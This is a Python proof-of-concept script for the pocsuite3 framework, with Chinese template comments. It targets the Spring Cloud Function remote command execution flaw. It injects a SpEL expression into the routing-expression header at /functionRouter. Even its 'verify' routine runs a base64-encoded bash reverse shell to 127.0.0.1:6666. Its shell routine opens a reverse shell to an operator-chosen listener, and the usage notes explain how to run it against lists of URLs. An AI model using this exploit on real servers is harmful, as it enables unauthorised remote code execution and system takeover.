from collections import OrderedDict
from urllib.parse import urljoin
import re,os
import base64
from requests_toolbelt import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY,get_listener_ip,get_listener_port


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-03-31'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-03-31'  # 编写 PoC 的日期
    updateDate = '2022-03-31'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'spring-cloud-function-rce'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'spring-cloud-function'  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        :spring-cloud-function 存在远程命令执行漏洞  
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测: pocsuite -r poc.py -u url(-f url.txt) --verify 
    反弹shell: pocsuite -r poc.py -u url(-f url.txt) --shell --lhost (反弹地址) --lport (反弹端口)
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()),
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):
        result = {}
        path = "/functionRouter"
        url = self.url + path
        cmd = '"'+"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}"+'"'
        headers={
            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec('+cmd+')'
            }
        
        try:
            resq = requests.post(url=url,headers=headers,data='1')
            if  resq.status_code == 500 :
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = url
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    
    def _shell(self):
        result = {}
        path = "/functionRouter"
        url = self.url + path
        cmd = self.get_option("command")
        cmd = cmd.encode('utf-8')
        cmd = str(base64.b64encode(cmd))
        cmd = cmd.strip('b')
        cmd = cmd.strip("'")
        cmd = 'bash -c {echo,' + cmd + '}|{base64,-d}|{bash,-i}'
        headers={
            'spring.cloud.function.routing-expression': f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
            }
        
        try:
            resq = requests.post(url=url,headers=headers,data='1')
        except Exception as e:
            return

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(POC)